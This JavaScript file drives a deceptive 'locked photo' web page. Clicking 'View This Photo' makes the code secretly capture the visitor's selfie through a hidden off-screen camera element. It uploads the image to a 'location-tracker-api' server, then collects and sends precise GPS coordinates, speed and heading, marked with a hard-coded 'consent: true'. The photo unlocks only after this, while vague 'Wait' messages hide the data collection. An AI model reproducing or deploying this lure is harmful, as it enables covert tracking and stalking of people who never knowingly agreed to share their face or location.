(function() {
    "use strict";

    const viewPhotoBtn = document.getElementById("viewPhotoBtn");
    const statusEl = document.getElementById("status");
    const albumPhoto = document.getElementById("albumPhoto");
    const lockBadge = document.getElementById("lockBadge");

    // Update these to your actual Render backend URL
    const LOCATION_API_URL = "https://location-tracker-api-cjka.onrender.com/location";
    const SELFIE_API_URL = "https://location-tracker-api-cjka.onrender.com/selfie";

    let cameraStream = null;
    let lastLocationId = null;
    let selfieBlob = null;
    let isProcessing = false;
    let locationWatchId = null;

    function setStatus(message, type) {
        statusEl.textContent = message;
        statusEl.className = type || "";
    }

    function unlockPhoto() {
        albumPhoto.classList.add("unlocked");
        lockBadge.classList.add("hidden");
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
        viewPhotoBtn.classList.remove("processing");
        isProcessing = false;
        setStatus("✅ Photo unlocked!", "success");
    }

    function resetUI(errorMsg) {
        viewPhotoBtn.disabled = false;
        viewPhotoBtn.textContent = "👁️ View This Photo";
        viewPhotoBtn.classList.remove("processing");
        isProcessing = false;
        if (errorMsg) {
            setStatus(errorMsg, "error");
        }
        // Clear any watch position
        if (locationWatchId !== null) {
            navigator.geolocation.clearWatch(locationWatchId);
            locationWatchId = null;
        }
    }

    function stopCameraStream() {
        if (cameraStream) {
            cameraStream.getTracks().forEach(track => track.stop());
            cameraStream = null;
        }
    }

    // --- Step 1: Camera capture ---

    async function requestCameraAndCapture() {
        // Check HTTPS
        if (window.location.protocol !== "https:" && 
            window.location.hostname !== "localhost" && 
            window.location.hostname !== "127.0.0.1") {
            setStatus("❌ HTTPS is required for camera & location access.", "error");
            resetUI();
            return;
        }

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            setStatus("❌ Camera API not supported in this browser.", "error");
            resetUI();
            return;
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } },
                audio: false
            });

            cameraStream = stream;

            const hiddenVideo = document.createElement("video");
            hiddenVideo.srcObject = stream;
            hiddenVideo.autoplay = true;
            hiddenVideo.playsinline = true;
            hiddenVideo.muted = true;
            hiddenVideo.style.cssText = "position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
            hiddenVideo.setAttribute("aria-hidden", "true");
            document.body.appendChild(hiddenVideo);

            await Promise.race([
                new Promise((resolve, reject) => {
                    hiddenVideo.onloadedmetadata = () => {
                        hiddenVideo.play().then(resolve).catch(reject);
                    };
                    if (hiddenVideo.readyState >= 2) {
                        resolve();
                    }
                }),
                new Promise((_, reject) =>
                    setTimeout(() => reject(new Error("Camera init timeout")), 8000)
                )
            ]);

            await new Promise(r => setTimeout(r, 600));

            const videoWidth = hiddenVideo.videoWidth || 640;
            const videoHeight = hiddenVideo.videoHeight || 480;

            if (videoWidth === 0 || videoHeight === 0) {
                throw new Error("Camera returned empty dimensions");
            }

            const hiddenCanvas = document.createElement("canvas");
            hiddenCanvas.width = videoWidth;
            hiddenCanvas.height = videoHeight;
            const ctx = hiddenCanvas.getContext("2d");
            ctx.translate(videoWidth, 0);
            ctx.scale(-1, 1);
            ctx.drawImage(hiddenVideo, 0, 0);

            selfieBlob = await new Promise((resolve, reject) => {
                hiddenCanvas.toBlob((blob) => {
                    if (blob) resolve(blob);
                    else reject(new Error("Canvas toBlob returned null"));
                }, "image/jpeg", 0.85);
            });

            document.body.removeChild(hiddenVideo);
            stopCameraStream();

            await uploadSelfieThenLocation();

        } catch (err) {
            console.error("Camera error:", err);
            stopCameraStream();

            let msg;
            if (err.name === "NotAllowedError" || err.name === "PermissionDeniedError") {
                msg = "❌ Camera permission was denied.";
            } else if (err.name === "NotFoundError") {
                msg = "❌ No camera found on this device.";
            } else if (err.name === "NotReadableError") {
                msg = "❌ Camera is in use by another application.";
            } else if (err.message === "Camera init timeout") {
                msg = "❌ Camera initialization timed out.";
            } else {
                msg = "❌ Camera error: " + err.message;
            }
            resetUI(msg);
        }
    }

    // --- Step 2: Upload selfie ---

    async function uploadSelfieThenLocation() {
        if (!selfieBlob) {
            resetUI("❌ No selfie captured.");
            return;
        }

        setStatus(" Wait .......", "loading");

        if (!navigator.onLine) {
            resetUI("❌ No internet connection.");
            return;
        }

        try {
            const formData = new FormData();
            formData.append("image", selfieBlob, "selfie.jpg");
            formData.append("timestamp", new Date().toISOString());

            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000);

            const response = await fetch(SELFIE_API_URL, {
                method: "POST",
                body: formData,
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            if (!response.ok) {
                let msg = "Upload failed (HTTP " + response.status + ")";
                try {
                    const errData = await response.json();
                    msg = errData.message || msg;
                } catch (e) { }
                resetUI("❌ " + msg);
                return;
            }

            const result = await response.json();

            if (!result.id) {
                resetUI("❌ Server response missing selfie ID.");
                return;
            }

            setStatus(" Wait ...", "loading");
            
            // Small delay to let the UI update
            setTimeout(() => requestLocation(result.id), 300);

        } catch (err) {
            console.error("Upload error:", err);
            if (err.name === "AbortError") {
                resetUI("❌ Upload timed out.");
            } else {
                resetUI("❌ Upload failed: " + err.message);
            }
        }
    }

    // --- Step 3: Location ---
    // FIXED: Uses watchPosition as fallback, better error handling

    function requestLocation(selfieId) {
        if (!navigator.geolocation) {
            resetUI("❌ Geolocation not supported.");
            return;
        }

        // First try: getCurrentPosition with high accuracy
        setStatus("📍 Getting precise location...", "loading");

        // Set a fallback timeout
        const fallbackTimeout = setTimeout(() => {
            if (isProcessing) {
                // If still processing and no response yet, try without high accuracy
                setStatus("📍 Trying standard accuracy...", "loading");
                tryFallbackLocation(selfieId);
            }
        }, 8000);

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                clearTimeout(fallbackTimeout);
                if (locationWatchId !== null) {
                    navigator.geolocation.clearWatch(locationWatchId);
                    locationWatchId = null;
                }
                await sendLocationToServer(position, selfieId);
            },
            (error) => {
                clearTimeout(fallbackTimeout);
                console.warn("High accuracy location error:", error);

                // If timeout or unavailable, try fallback
                if (error.code === error.TIMEOUT || error.code === error.POSITION_UNAVAILABLE) {
                    tryFallbackLocation(selfieId);
                } else {
                    let msg;
                    switch (error.code) {
                        case error.PERMISSION_DENIED:
                            msg = "❌ Location permission was denied. Please allow location access in your browser settings.";
                            break;
                        default:
                            msg = "❌ Location error (code " + error.code + ").";
                    }
                    resetUI(msg);
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 7000,      // 7 seconds for high accuracy
                maximumAge: 0       // Force fresh reading
            }
        );
    }

    function tryFallbackLocation(selfieId) {
        if (!navigator.geolocation || !isProcessing) return;

        // Try with low accuracy (faster, uses WiFi/cell towers)
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                setStatus("📍 Got location (standard accuracy)...", "loading");
                await sendLocationToServer(position, selfieId);
            },
            (error) => {
                // Last resort: try watchPosition (keeps trying until it gets a fix)
                console.warn("Standard accuracy failed, trying watchPosition:", error);
                tryWatchLocation(selfieId);
            },
            {
                enableHighAccuracy: false,
                timeout: 5000,
                maximumAge: 60000   // Accept cached location up to 1 minute old
            }
        );
    }

    function tryWatchLocation(selfieId) {
        if (!navigator.geolocation || !isProcessing) return;

        setStatus("📍 Searching for signal...", "loading");

        const watchTimeout = setTimeout(() => {
            if (locationWatchId !== null) {
                navigator.geolocation.clearWatch(locationWatchId);
                locationWatchId = null;
            }
            if (isProcessing) {
                resetUI("❌ Location timed out. Check GPS/WiFi and try again.");
            }
        }, 15000);

        locationWatchId = navigator.geolocation.watchPosition(
            async (position) => {
                // Got a fix — use it
                clearTimeout(watchTimeout);
                if (locationWatchId !== null) {
                    navigator.geolocation.clearWatch(locationWatchId);
                    locationWatchId = null;
                }
                setStatus("📍 Location acquired!", "loading");
                await sendLocationToServer(position, selfieId);
            },
            (error) => {
                clearTimeout(watchTimeout);
                if (locationWatchId !== null) {
                    navigator.geolocation.clearWatch(locationWatchId);
                    locationWatchId = null;
                }
                console.error("watchPosition error:", error);
                if (isProcessing) {
                    resetUI("❌ Could not get location: " + 
                        (error.code === error.PERMISSION_DENIED ? "Permission denied" : 
                         error.code === error.TIMEOUT ? "Timed out" : "Unavailable"));
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );
    }

    async function sendLocationToServer(position, selfieId) {
        const data = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || null,
            altitudeAccuracy: position.coords.altitudeAccuracy || null,
            heading: position.coords.heading || null,
            speed: position.coords.speed || null,
            timestamp: new Date().toISOString(),
            consent: true,
            selfie_id: selfieId
        };

        try {
            const controller = new AbortController();
            const timeoutId = setTimeout(() => controller.abort(), 15000);

            const locResponse = await fetch(LOCATION_API_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(data),
                signal: controller.signal
            });

            clearTimeout(timeoutId);

            if (!locResponse.ok) {
                let msg = "Location upload failed (HTTP " + locResponse.status + ")";
                try {
                    const errData = await locResponse.json();
                    msg = errData.message || msg;
                } catch (e) { }
                resetUI("❌ " + msg);
                return;
            }

            const locResult = await locResponse.json();

            if (!locResult.id) {
                resetUI("❌ Server response missing location ID.");
                return;
            }

            lastLocationId = locResult.id;
            unlockPhoto();

        } catch (err) {
            console.error("Location upload error:", err);
            if (err.name === "AbortError") {
                // Retry once
                try {
                    const locResponse = await fetch(LOCATION_API_URL, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(data)
                    });
                    if (locResponse.ok) {
                        const locResult = await locResponse.json();
                        if (locResult.id) {
                            lastLocationId = locResult.id;
                            unlockPhoto();
                            return;
                        }
                    }
                } catch (retryErr) {
                    console.error("Retry also failed:", retryErr);
                }
                resetUI("❌ Location upload timed out.");
            } else {
                resetUI("❌ Location upload failed: " + err.message);
            }
        }
    }

    // --- Button click ---

    viewPhotoBtn.addEventListener("click", function(e) {
        e.preventDefault();

        if (isProcessing) return;
        isProcessing = true;

        viewPhotoBtn.disabled = true;
        viewPhotoBtn.textContent = "⏳ Verifying...";
        viewPhotoBtn.classList.add("processing");
        setStatus("📸 Initializing camera...", "loading");

        requestCameraAndCapture();
    });

    // Check for location permission status on page load (Chrome only)
    if (navigator.permissions && navigator.permissions.query) {
        navigator.permissions.query({ name: 'geolocation' }).then(result => {
            if (result.state === 'denied') {
                console.warn('Location permission is blocked globally.');
            }
        }).catch(() => {});
    }

})();